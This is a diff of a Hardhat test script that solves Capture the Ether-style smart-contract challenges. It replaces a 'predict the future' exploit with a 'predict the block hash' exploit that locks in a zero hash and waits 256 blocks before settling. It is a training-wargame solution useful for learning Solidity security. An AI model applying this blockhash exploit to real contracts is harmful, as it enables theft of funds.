@@ -1,71 +1,56 @@
 import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
-import {
-    PredictTheFutureChallenge,
-    GuessPredictAttacker,
-    GuessPredictAttacker__factory,
-} from "../typechain-types"
+import { PredictTheBlockHashChallenge } from "../typechain-types"
 import { assert, expect } from "chai"
 import { ethers, network } from "hardhat"
 import { mine } from "@nomicfoundation/hardhat-network-helpers"
 
-describe("Guess Secret Number challenge", function () {
+describe("Guess blockhash challenge", function () {
     let attacker: SignerWithAddress
-    let target: PredictTheFutureChallenge
+    let target: PredictTheBlockHashChallenge
     before(async function () {
         // Setup code here
         let instanceAddress: string =
-            "0xBb0D48d18AbE94AbBa271F030c3438b73115C6a5"
+            "0x2E5C051f71CC95a1223F7312A3F61181264a2124"
         ;[attacker] = await ethers.getSigners()
         target = await ethers.getContractAt(
-            "GuessTheRandomNumberChallenge",
+            "PredictTheBlockHashChallenge",
             instanceAddress,
             attacker
         )
     })
 
-    it("Guesses the secret number", async function () {
+    it("Guesses the blockhash", async function () {
         // Exploit code here
-        const attackerFactory: GuessPredictAttacker__factory =
-            await ethers.getContractFactory("GuessPredictAttacker")
-        const attackerContract: GuessPredictAttacker =
-            await attackerFactory.deploy(target.address)
-
-        let tx
-        tx = await attackerContract.submit(5, {
+        let tx, blockInitNum, blockFinNum
+        tx = await target.lockInGuess(ethers.constants.HashZero, {
             value: ethers.utils.parseEther("1"),
         })
         await tx.wait(1)
-        console.log(`Locked in with guess 5!`)
+        blockInitNum = await ethers.provider.getBlockNumber()
+        blockFinNum = blockInitNum + 256
 
-        for (let i = 0; i < 40; i++) {
-            console.log("----------------------------------------------------")
-            console.log(`Attempt ${i}`)
+        console.log(`Target block number: ${blockFinNum}`)
+        while (true) {
+            let currentBlockNum = await ethers.provider.getBlockNumber()
             console.log(
-                `Block number: ${await ethers.provider.getBlockNumber()}`
+                `Current block: ${await ethers.provider.getBlockNumber()}`
             )
-            try {
-                tx = await attackerContract.settleAttacker({ gasLimit: 300000 })
+            if (currentBlockNum >= blockFinNum) {
+                console.log(`Target block reached!`)
+                tx = await target.settle({ gasLimit: 50000 })
                 await tx.wait(1)
+                console.log(`Settled!`)
+                console.log(`Bool: ${await target.isComplete()}`)
                 break
-            } catch (e: any) {
-                if (
-                    network.name === "hardhat" ||
-                    network.name === "localhost"
-                ) {
-                    // await mine()
-                    if (e.message.includes("Wrong guess")) {
-                        console.log(`Wrong guess!`)
-                    } else {
-                        console.log(e)
-                    }
-                } else {
-                    if (e.message.includes("Wrong guess")) {
-                        console.log(`Wrong guess!`)
-                    } else {
-                        console.log(e)
-                    }
-                    await new Promise((r) => setTimeout(r, 30000))
-                }
+            }
+            console.log(
+                `Target block is ${blockFinNum - currentBlockNum} blocks away`
+            )
+            console.log(`Waiting...`)
+            if (network.name === "hardhat" || network.name === "localhost") {
+                await mine(blockFinNum - currentBlockNum + 1)
+            } else {
+                await new Promise((r) => setTimeout(r, 60000))
             }
         }
     })
